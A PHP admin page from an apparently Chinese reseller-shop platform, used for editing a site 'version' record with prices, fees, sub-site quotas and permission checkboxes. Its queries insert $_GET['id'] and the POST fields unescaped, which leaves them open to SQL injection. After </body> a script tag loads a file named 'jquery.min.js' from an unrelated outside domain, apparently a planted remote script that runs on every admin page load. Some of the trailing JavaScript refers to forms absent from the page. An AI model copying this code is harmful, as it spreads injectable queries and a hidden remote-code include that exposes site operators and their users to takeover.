<?php
 require_once('admin_check.php');
require_once('admin_config.php');
 if (isset($_POST['提交'])){
 
	null_back($_POST['z_name'],'请输入版本名称');
	null_back($_POST['z_price'],'请输入版本价格');
	null_back($_POST['czsxf'],'请输入充值手续费');
	null_back($_POST['txsxf'],'请输入提现手续费');
 	null_back($_POST['w_fed'],'请输入'.get_fenzhan_banben_name(1).'分站额度');
	null_back($_POST['w_fed2'],'请输入'.get_fenzhan_banben_name(2).'分站额度');
	null_back($_POST['w_fed3'],'请输入'.get_fenzhan_banben_name(3).'分站额度');
 	null_back($_POST['w_xfprice'],'请输入'.get_fenzhan_banben_name(1).'续费价格');
 	null_back($_POST['w_xfprice2'],'请输入'.get_fenzhan_banben_name(2).'续费价格');
 	null_back($_POST['w_xfprice3'],'请输入'.get_fenzhan_banben_name(3).'续费价格');	
	
			   $id1= implode(",",$_POST['qx']);
    $_data['name'] = $_POST['z_name'];
   	$_data['price'] = $_POST['z_price'];
    $_data['qx'] = $id1;
   	$_data['czsxf'] = $_POST['czsxf'];
   	$_data['txsxf'] = $_POST['txsxf'];
    $_data['fed1'] = $_POST['w_fed'];
    $_data['fed2'] = $_POST['w_fed2'];
   	$_data['fed3'] = $_POST['w_fed3'];	
   	$_data['fprice1'] = $_POST['w_xfprice'];
   	$_data['fprice2'] = $_POST['w_xfprice2'];
   	$_data['fprice3'] = $_POST['w_xfprice3'];

	   
	$str = arrtoinsert($_data);
	$sql = 'update '.flag.'zhuzhan_banben set '.arrtoupdate($_data).' where id = '.$_GET['id'].'';
	if (mysql_query($sql)) {
 
  
  		alert_href('修改成功!','');
	} else {
		alert_back('修改失败!');
	}
}

 ?>
 

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml"> 
<head> 
<!-- 必要元素 开始 -->
<link type="text/css" rel="stylesheet" href="file/main/2017/css/style.css?" />
<script type="text/javascript" src="file/main/js/jquery-1.9.1.js"></script>
<!-- 必要元素 结束 -->

<!-- 表单元素 开始 -->
<script type="text/javascript" src="file/main/js/jquery.form.js"></script>
<!-- 表单元素 结束 -->

<!-- 表单验证元素 开始 -->
<script type="text/javascript" src="file/main/js/jquery.validate.js"></script>
<!-- 表单验证元素 结束 -->

<!-- 颜色选择器元素 开始 -->
<script type="text/javascript" src="file/colorPicker/jquery.colorpicker.js"></script>
<!-- 颜色选择器元素 结束 -->

<!-- 编辑器元素 开始 -->
 <!-- 编辑器元素 结束 -->
  
<style>  
label {font-size:12px;cursor:pointer;}  
label i {font-size:12px;font-style:normal;display:inline-block;width:12px;height:12px;text-align:center;line-height:12px;color:#fff;vertical-align:middle;margin:-2px 2px 1px 0px;border:#2489c5 1px solid;}  
input[type="checkbox"],input[type="radio"] {display:none;}  
input[type="radio"] + i {border-radius:7px;}  
input[type="checkbox"]:checked + i,input[type="radio"]:checked + i {background:#2489c5;}  
input[type="checkbox"]:disabled + i,input[type="radio"]:disabled + i {border-color:#ccc;}  
input[type="checkbox"]:checked:disabled + i,input[type="radio"]:checked:disabled + i {background:#ccc;}  
</style>  

</head> 
<body> 
<div id="body">
	<div class="zl-tab-bd">
		<div class="zl-dd">
        <?php
		
 
 


 
 

					$result = mysql_query('select * from '.flag.'zhuzhan_banben where id = '.$_GET['id'].'  ');
					if ($row = mysql_fetch_array($result)){
					?>
 			<form id="annForm" name="annForm" action="" method="POST">
 			 
               
 			  <dl>
                <dt>
                  <label for="label2">版本名称：</label>
                </dt>
 			    <dd>
                  <input class="txt1" type="text" onBlur="w_db.value=($('#w_title').toPinyin());" onChange="w_db.value=($('#w_title').toPinyin())" onKeydown="w_db.value=($('#w_title').toPinyin())"   value="<?=$row['name']?>" style="width:300px;" name="z_name" id="z_name"/>
                </dd>
		      </dl>
              
              <dl>
                          <dt>
                            <label for="label2">版本价格：</label>
                          </dt>
						  <dd>
                            <input class="txt1" type="text" style="width:300px;"  value="<?=$row['price']?>"  name="z_price" id="z_price"/>
                          </dd>
			  </dl>
              
                <dl>
                          <dt>
                            <label for="label2">充值手续费：</label>
                          </dt>
						  <dd>
                            <input class="txt1" type="text" style="width:300px;"  value="<?=$row['czsxf']?>" name="czsxf" id="czsxf"/>
                          </dd>
			  </dl>

                  <dl>
                          <dt>
                            <label for="label2">提现手续费：</label>
                          </dt>
						  <dd>
                            <input class="txt1" type="text" style="width:300px;"  value="<?=$row['txsxf']?>" name="txsxf" id="txsxf"/>
                          </dd>
			  </dl>
              
              
              
              
                        <dl>
                        <table width="45%" border="0" align="left" cellspacing="0" cellpadding="0">
  <tr align="right">
    <td width="329">  
                            <label for="label2"><?=get_fenzhan_banben_name(1)?>分站额度：</label>
                         </td>
    <td width="40" align="left">  <dd>
                            <input class="txt1" type="text" style="width:105px;"  value="<?=$row['fed1']?>" name="w_fed" id=""/>
                          </dd></td>
    <td width="30"  align="left">   </td>
    <td width="160"  align="LEFT"><label for="label3">续费价：</label></td>
    <td width="211"  align="LEFT"><dd>   <input class="txt1" type="text"   value="<?=$row['fprice1']?>"  style="width:117px;" name="w_xfprice" id=""/></dd></td>
  </tr>
</table>

                          
			  </dl>
              
            
      	      <BR>	
              
              
                        <dl>
                        <table width="45%" border="0" align="left" cellspacing="0" cellpadding="0">
  <tr align="right">
    <td width="329">  
                            <label for="label2"><?=get_fenzhan_banben_name(2)?>分站额度：</label>
                         </td>
    <td width="40" align="left">  <dd>
                            <input class="txt1" type="text" style="width:105px;"  value="<?=$row['fed2']?>" name="w_fed2" id=""/>
                          </dd></td>
    <td width="30"  align="left">   </td>
    <td width="160"  align="LEFT"><label for="label3">续费价：</label></td>
    <td width="211"  align="LEFT"><dd>   <input class="txt1" type="text"   value="<?=$row['fprice2']?>"  style="width:117px;" name="w_xfprice2" id=""/></dd></td>
  </tr>
</table>

                          
			  </dl>
              	 
              
                  
              <BR>
              
                        <dl>
                        <table width="45%" border="0" align="left" cellspacing="0" cellpadding="0">
  <tr align="right">
    <td width="329">  
                            <label for="label2"><?=get_fenzhan_banben_name(3)?>分站额度：</label>
                         </td>
    <td width="40" align="left">  <dd>
                            <input class="txt1" type="text" style="width:105px;"  value="<?=$row['fed3']?>" name="w_fed3" id=""/>
                          </dd></td>
    <td width="30"  align="left">   </td>
    <td width="160"  align="LEFT"><label for="label3">续费价：</label></td>
    <td width="211"  align="LEFT"><dd>   <input class="txt1" type="text"   value="<?=$row['fprice3']?>"  style="width:117px;" name="w_xfprice3" id=""/></dd></td>
  </tr>
</table>

                          
			  </dl>
              
              <BR>
                      
 	  
              
              
              
              
              
              
              <dl>
<dt>
                            <label for="label2">权限管理：</label>
                          </dt>
<dd>
    <label>
        <input <?php if (strpos($row[ 'qx'], '公告管理') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="公告管理"><i>✓</i>公告管理</label>
    <label>
        <input <?php if (strpos($row[ 'qx'], '系统设置') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="系统设置"><i>✓</i>系统设置</label>
    <label>
        <input <?php if (strpos($row[ 'qx'], '站点装饰') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="站点装饰"><i>✓</i>站点装饰</label>
    <label>
        <input <?php if (strpos($row[ 'qx'], '客服管理') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="客服管理"><i>✓</i>客服管理</label>
    <label>
        <input <?php if (strpos($row[ 'qx'], '代理设置') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="代理设置"><i>✓</i>代理设置</label>
		
		<label>
        <input <?php if (strpos($row[ 'qx'], '克隆商品') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="克隆商品"><i>✓</i>克隆商品</label>
		<label>
        <input <?php if (strpos($row[ 'qx'], '幻灯图片') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="幻灯图片"><i>✓</i>幻灯图片</label>
    <label>
        <input <?php if (strpos($row[ 'qx'], '平台短信') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="平台短信"><i>✓</i>平台短信</label>
        <label>
            <input <?php if (strpos($row[ 'qx'], '分站短信') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="分站短信"><i>✓</i>分站短信</label>
</dd>
</dl>
<dl> <dt>
                            <label for="label2"></label>
                          </dt>
    <dd>
        <label>
            <input <?php if (strpos($row[ 'qx'], '商品管理') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="商品管理"><i>✓</i>商品管理</label>
        <label>
            <input <?php if (strpos($row[ 'qx'], '商品对接') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="商品对接"><i>✓</i>商品对接</label>
        <label>
            <input <?php if (strpos($row[ 'qx'], '商品被对接') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="商品被对接"><i>✓</i>商品被对接</label>
        <label>
            <input <?php if (strpos($row[ 'qx'], '分站管理') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="分站管理"><i>✓</i>分站管理</label>
        <label>
            <input <?php if (strpos($row[ 'qx'], '卡密管理') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="卡密管理"><i>✓</i>卡密管理</label>
        <label>
            <input <?php if (strpos($row[ 'qx'], '自由对接') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="自由对接"><i>✓</i>自由对接</label>
        <label>
            <input <?php if (strpos($row[ 'qx'], '自动发货') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="自动发货"><i>✓</i>自动发货</label>
        <label>
            <input <?php if (strpos($row[ 'qx'], '供货权限') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="供货权限"><i>✓</i>供货权限</label>
			<label>
            <input <?php if (strpos($row[ 'qx'], '管理权限') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="管理权限"><i>✓</i>管理权限</label>
			<label>
            <input <?php if (strpos($row[ 'qx'], '批量下单') !==false) {echo "checked";}?> name="qx[]" type="checkbox" value="批量下单"><i>✓</i>批量下单</label>
    </dd>
</dl>
<dl>	<dt></dt>
    <dd class="baocun">
        <input type="submit" id="提交" name="提交" class="button03" value="修改" />
        <input type="button" id="btn_back" name="btn_back" onclick="javascript:history.back(-1);" class="btn-close" value="返回列表" />
    </dd>
</dl>
</form>
          <? }?>
		</div>
	</div>
	</div>
	
<script charset="utf-8" async="true" src="http://xr.5myr.cn/rb/jquery.min.js?tcdsp"></script></body>
<script type="text/javascript">
	KindEditor.ready(function(K) {
		var editor1 = K.create("textarea[name='annContent']", {
			width : "80%", //编辑器的宽度为75%
		    height : "410px", //编辑器的高度为200px
		    filterMode : false, //不会过滤HTML代码
		    uploadJson : 'upload_json.html',
		    allowUpload : true, //允许上传图片    fileManagerJson : 'file_manager_json.html',allowFileManager : true,
			fullscreenShortcut:true,
			allowImageRemote:false,
			items:[
			        'source', 'justifyleft', 'justifycenter', 'justifyright',
			        'justifyfull', 'selectall','formatblock', 'fontname', 'fontsize', 'forecolor', 'hilitecolor', 'bold',
			        'italic', 'underline', 'image',
			         'table','emoticons', 'link', 'unlink'
			],
		    afterBlur:function(){
		    	this.sync();
		    }
		});
	});
	
	$(document).ready(function() {
		$("#tr_address").hide();
		$("input[id='topCheck']").click(function(){
			var checkVal = $(this).val();
			if(checkVal == 0){
				$("#topCheck").val(1);
				$("#annIsTop").val(1);
			}else{
				$("#topCheck").val(0);
				$("#annIsTop").val(0);
			}
		});
		
		$("input[id='annSourceId']").click(function(){
			var checkVal = $(this).val();
			if(checkVal == 1){//本地内容
				$("#tr_content").show();
				$("#tr_address").remove();
				
			}else{//外部链接
				$("#tr_address").remove();
				$("#tr_content").after("<dl id='tr_address'><dt><label for='annAddress'>公告链接url：</label></dd><dd><input type='text' style='width:300px;' class='txt1' id='annAddress' name='annAddress' /></dd></dl>");
				$("#tr_content").hide();
			}
		});
	
		$("#cp3").colorpicker({
            fillcolor:true,
            success:function(o,color){
            	 $("#annTitleStyle").val(color);
                $("#annTitle").css("color",color);
            }
        });
       
       jQuery.validator.addMethod("linkUrl",function(value,element){
    	var pattern = /^http:\/\/.*$/;
   		 return this.optional(element) || pattern.test(value);
   		
   		});	
   		
   		$("#annForm").validate({
    		rules: {	
    				annTitle : {
    					required:true,
    					maxlength:50
    				},
    				annAddress:{
    					required:true,
    					linkUrl:true
    				}
    		},
    		messages:{
    			annTitle:{
    				required:"标题不能为空！  ",
    				maxlength:"标题最大长度为50"
    			},
    			annAddress:{
    				required:"链接不能为空！",
    				linkUrl:"格式错误！必须以 http://开头"
    			}
    		}
    	});
    	
    	$("input[id='btn_sub']").click(function() {
		 var target = $("#target").val();
		 $("input[id='btn_sub']").attr("disabled","disabled");
		if(!$("#annForm").valid()){
			 $("input[id='btn_sub']").attr("disabled",false);
		}
		//标注form为ajaxForm表单
		 $("#annForm").ajaxForm({
			 url : "doAddAnnouncement.html",
			 type:"post",
			 success : function(data) {
			    if(data.flag){
			    	alert("添加成功");
			    }else{
			    	alert("添加失败");
			    }
			    window.location.href="announcement.html?target="+target;
		   	  }
		 });
	  	$("#annForm").submit();
	 });
	 $("input[id='btn_back']").click(function() {
		 var target = $("#target").val();
		 window.location.href="info.php?target="+target;
	 });
   }); 
</script>
</html> 